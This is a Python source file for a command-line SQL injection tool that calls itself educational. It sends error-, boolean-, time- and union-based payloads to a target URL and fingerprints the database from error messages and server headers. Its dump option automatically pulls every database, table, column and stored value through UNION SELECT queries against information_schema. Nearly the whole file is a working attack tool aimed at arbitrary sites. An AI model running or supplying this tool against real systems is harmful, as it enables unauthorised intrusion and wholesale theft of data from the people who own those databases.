import requests
import re
import logging
import argparse
import random

from payloads import payloads


# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

TIPS = [
    "Tip: Boolean-based injections rely on comparing True and False conditions.",
    "Tip: Error-based injections leverage database error messages for information.",
    "Tip: Time-based injections use deliberate delays to deduce database behavior.",
    "Tip: Union-based injections combine results from multiple queries into one output.",
    "Tip: Custom payloads can help target specific vulnerabilities.",
    "Tip: Always sanitize user inputs to prevent SQL injection attacks.",
    "Tip: Understanding DBMS-specific error patterns is key to effective testing.",
    "Tip: Use HTTP request files to test more complex injection scenarios.",
]

def fetch_banner_info(url):
    """
    Fetch banner and system information from the target URL.
    """
    logging.info("[+] Fetching system information...")
    info = {
        "web_server_os": "Unknown",
        "web_technology": "Unknown",
        "dbms_os": "Unknown",
        "dbms": "Unknown",
        "banner": "Unknown",
    }
    try:
        response = requests.get(url, timeout=10)
        headers = response.headers

        # Extract web server information
        if "Server" in headers:
            info["web_technology"] = headers["Server"]

        # Extract application technology
        if "X-Powered-By" in headers:
            info["web_server_os"] = headers["X-Powered-By"]

        # Simulate extracting DBMS info (real-world tools use advanced methods)
        error_response = requests.get(f"{url}'", timeout=10)
        dbms_patterns = {
            "MySQL": r"MySQL|SQL syntax.*MySQL",
            "PostgreSQL": r"PostgreSQL.*ERROR",
            "Microsoft SQL Server": r"Driver.* SQL Server|OLE DB.* SQL Server",
            "Oracle": r"ORA-\d{5}",
        }
        for dbms, pattern in dbms_patterns.items():
            if re.search(pattern, error_response.text, re.IGNORECASE):
                info["dbms"] = dbms
                info["banner"] = re.search(pattern, error_response.text, re.IGNORECASE).group(0)
                break

    except Exception as e:
        logging.error(f"[!] Error fetching system information: {e}")
    return info

def display_random_tip():
    """
    Display a random educational tip from the TIPS list.
    """
    tip = random.choice(TIPS)
    print(f"    [~] {tip}")

def dump_database(url, param_name):
    """
    Automates database extraction after detecting a SQL injection vulnerability.
    """
    logging.info("[+] Starting automated database extraction...")
    extracted_data = {"databases": []}

    # Step 1: Extract database names
    logging.info("[+] Extracting database names...")
    database_payload = f"' UNION SELECT schema_name, NULL, NULL FROM information_schema.schemata --"
    db_url = url.replace(f"{param_name}=1", f"{param_name}={database_payload}")
    try:
        response = requests.get(db_url, timeout=10)
        databases = re.findall(r"(?<=<td>)(.*?)(?=</td>)", response.text)
        extracted_data["databases"] = databases
        logging.info(f"    Found databases: {', '.join(databases)}")
    except Exception as e:
        logging.error(f"[!] Error extracting databases: {e}")
        return extracted_data

    # Step 2: Extract table names for each database
    for database in databases:
        logging.info(f"[+] Extracting tables from database: {database}...")
        table_payload = f"' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema='{database}' --"
        table_url = url.replace(f"{param_name}=1", f"{param_name}={table_payload}")
        try:
            response = requests.get(table_url, timeout=10)
            tables = re.findall(r"(?<=<td>)(.*?)(?=</td>)", response.text)
            extracted_data[database] = {"tables": tables}
            logging.info(f"    Found tables: {', '.join(tables)}")
        except Exception as e:
            logging.error(f"[!] Error extracting tables from {database}: {e}")
            continue

        # Step 3: Extract column names for each table
        for table in tables:
            logging.info(f"[+] Extracting columns from table: {table}...")
            column_payload = f"' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='{table}' --"
            column_url = url.replace(f"{param_name}=1", f"{param_name}={column_payload}")
            try:
                response = requests.get(column_url, timeout=10)
                columns = re.findall(r"(?<=<td>)(.*?)(?=</td>)", response.text)
                extracted_data[database][table] = {"columns": columns}
                logging.info(f"    Found columns: {', '.join(columns)}")
            except Exception as e:
                logging.error(f"[!] Error extracting columns from {table}: {e}")
                continue

            # Step 4: Extract data from each column
            for column in columns:
                logging.info(f"[+] Extracting data from column: {column}...")
                data_payload = f"' UNION SELECT {column}, NULL, NULL FROM {table} --"
                data_url = url.replace(f"{param_name}=1", f"{param_name}={data_payload}")
                try:
                    response = requests.get(data_url, timeout=10)
                    data = re.findall(r"(?<=<td>)(.*?)(?=</td>)", response.text)
                    extracted_data[database][table][column] = data
                    logging.info(f"    Extracted data from column '{column}': {', '.join(data)}")
                except Exception as e:
                    logging.error(f"[!] Error extracting data from column {column}: {e}")
                    continue

    return extracted_data


def detect_sql_injection(url, param_name, techniques, educational=False):
    """
    Test for SQL injection vulnerabilities using multiple techniques with educational explanations.
    """
    results = []
    for technique in techniques:
        display_random_tip()  # Show a tip before each technique
        logging.info(f"[+] Step: Testing {technique['name']}.")
        if educational:
            logging.info(f"    Explanation: {technique.get('explanation', 'No explanation available.')}")
        technique_result = {
            "name": technique["name"],
            "explanation": technique.get("explanation", "No explanation available."),
            "payloads": [],
        }
        for payload in technique["payloads"]:
            test_url = url.replace(f"{param_name}=1", f"{param_name}={payload}")
            result = {"payload": payload, "vulnerable": False, "details": ""}
            try:
                response = requests.get(test_url, timeout=10)
                response_time = response.elapsed.total_seconds()

                if "error_patterns" in technique:
                    for dbms, pattern in technique["error_patterns"].items():
                        if re.search(pattern, response.text, re.IGNORECASE):
                            result["vulnerable"] = True
                            result["details"] = f"DBMS: {dbms}"
                            break

                if "response_time_threshold" in technique and response_time > technique["response_time_threshold"]:
                    result["vulnerable"] = True
                    result["details"] = "Time-based delay detected"
                if result["vulnerable"]:
                    logging.info(f"    Result: Vulnerability found! {result['details']}, Payload: {payload}")
                else:
                    logging.info(f"    Result: Not Vulnerable, Payload: {payload}")
            except Exception as e:
                result["details"] = f"Error: {e}"
                logging.error(f"[!] Error testing payload {payload}: {e}")
            technique_result["payloads"].append(result)
        results.append(technique_result)
    return results

def main():
    parser = argparse.ArgumentParser(description="SQL Injection Testing Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://www.site.com/vuln.php?id=1)")
    parser.add_argument("-b", "--banner", action="store_true", help="Fetch and display system information")
    parser.add_argument("--test-boolean", action="store_true", help="Test Boolean-Based Blind Injection")
    parser.add_argument("--test-error", action="store_true", help="Test Error-Based Injection")
    parser.add_argument("--test-time", action="store_true", help="Test Time-Based Blind Injection")
    parser.add_argument("--test-union", action="store_true", help="Test Union-Based Injection")
    parser.add_argument("--custom-payload", action="store_true", help="Test custom payloads")
    parser.add_argument("--educational", action="store_true", help="Enable educational mode to explain each step")
    parser.add_argument("--dump-db", action="store_true", help="Automatically extract database information if a vulnerability is found")

    args = parser.parse_args()
    target_url = args.url
    educational_mode = args.educational

    techniques = []
     
    if args.test_error or not any([args.test_boolean, args.test_error, args.test_time, args.test_union, args.custom_payload]):
        techniques.append({
            "name": "Error-Based Injection",
            "payloads": [
                "1' AND 1=1 --",
                "1' AND 1=2 --",
                "1' UNION SELECT NULL, NULL, NULL --",
            ],
            "error_patterns": {
                "MySQL": r"SQL syntax.*MySQL",
                "PostgreSQL": r"PostgreSQL.*ERROR",
                "Microsoft SQL Server": r"Driver.* SQL Server|OLE DB.* SQL Server",
                "Oracle": r"ORA-\\d{5}",
            },
            "explanation": "Error-based injection triggers error messages that reveal database information."
        })

    if args.test_boolean or not any([args.test_boolean, args.test_error, args.test_time, args.test_union, args.custom_payload]):
        techniques.append({
            "name": "Boolean-Based Blind Injection",
            "payloads": [
                "1 AND 1=1",
                "1 AND 1=2",
            ],
            "explanation": "Boolean-based injection tests how the application responds to different true/false conditions."
        })

    if args.test_time or not any([args.test_boolean, args.test_error, args.test_time, args.test_union, args.custom_payload]):
        techniques.append({
            "name": "Time-Based Blind Injection",
            "payloads": [
                "1 AND SLEEP(5)",
                "1 OR SLEEP(5)",
            ],
            "response_time_threshold": 5,
            "explanation": "Time-based injection introduces delays to infer database behavior without visible output."
        })

    if args.test_union or not any([args.test_boolean, args.test_error, args.test_time, args.test_union, args.custom_payload]):
        techniques.append({
            "name": "Union-Based Injection",
            "payloads": [
                "1 UNION SELECT NULL, NULL, NULL",
                "1 UNION SELECT 1, 'test', NULL",
            ],
            "explanation": "Union-based injection combines results from multiple queries into a single result set."
        })

    if args.custom_payload:
        custom_payloads = input("[?] Enter your custom payloads (comma-separated): ").split(",")
        techniques.append({
            "name": "Custom Payload Testing",
            "payloads": [payload.strip() for payload in custom_payloads],
            "explanation": "Custom payloads are user-defined and allow targeting specific vulnerabilities."
        })

    logging.info(f"[+] Processing URL target: {target_url}")
    results = detect_sql_injection(target_url, "cat", techniques, educational=educational_mode)

    if args.dump_db:
        extracted_data = dump_database(target_url, "cat")
        print("\n[+] Database Extraction Results:")
        for db, db_data in extracted_data.items():
            if db == "databases":
                continue  # Skip the 'databases' list
            print(f"\n[*] Database: {db}")
            for table, table_data in db_data.items():
                if table == "tables":
                    continue  # Skip the 'tables' list
                print(f"    Table: {table}")
                for column, data in table_data.items():
                    if column == "columns":
                        continue  # Skip the 'columns' list
                    print(f"        Column: {column}")
                    if data:
                        print(f"            Data: {', '.join(data)}")
                    else:
                        print("            Data: No data found")

    if args.banner:
        banner_info = fetch_banner_info(target_url)
        print("\n[+] System Information:")
        for key, value in banner_info.items():
            print(f"    {key.replace('_', ' ').title()}: {value}")

    # Final Report
    print("\n[+] Final Report:")
    for result in results:
        print(f"\n[*] Technique: {result['name']}")
        print(f"    Explanation: {result['explanation']}")
        for payload_result in result["payloads"]:
            status = "Vulnerable" if payload_result["vulnerable"] else "Not Vulnerable"
            details = payload_result["details"]
            print(f"    Payload: {payload_result['payload']}")
            print(f"    Result: {status}")
            if details:
                print(f"    Details: {details}")
    print("\n[+] Testing completed!!! Check the results above.")

if __name__ == "__main__":
    main()
